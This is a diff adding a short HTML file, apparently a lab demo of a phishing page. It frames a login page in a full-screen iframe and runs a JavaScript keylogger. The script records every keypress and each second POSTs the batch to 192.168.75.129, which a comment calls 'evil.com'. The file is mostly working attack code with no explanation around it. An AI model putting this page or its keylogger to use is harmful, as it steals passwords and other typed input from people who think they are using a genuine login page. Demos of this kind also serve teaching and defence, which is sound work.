@@ -1,0 +1,39 @@
+<!-- http://evil.com/example.com-login.html -->
+<head>
+<style>
+    body{
+        margin: 0; /* Remove default margin */
+    }
+    iframe{      
+        display: block;  /* iframes are inline by default */   
+        height: 100vh;  /* Set height to 100% of the viewport height */   
+        width: 100vw;  /* Set width to 100% of the viewport width */     
+        border: none; /* Remove default border */
+        background: lightyellow; /* Just for styling */
+    }
+</style>
+<script>
+// array of user keystrokes
+var keystrokes = [];
+// event listener which captures user keystrokes
+document.onkeypress = function() {
+    keystrokes.push(window.event.keyCode);
+}
+// function which reports keytrokes back to evil.com every second
+setInterval(function() {
+    if (keystrokes.length) {
+        var xhr = newXHR();
+        xhr.open("POST", "http://192.168.75.129");
+        xhr.send(keystrokes.join("+"));
+    }
+    keystrokes = [];
+}, 1000);
+// function which creates an ajax request object
+function newXHR() {
+    if (window.XMLHttpRequest)
+        return new XMLHttpRequest();
+    return new ActiveXObject("MSXML2.XMLHTTP.3.0");
+}
+</script>
+</head>
+<iframe src="http://"></iframe>
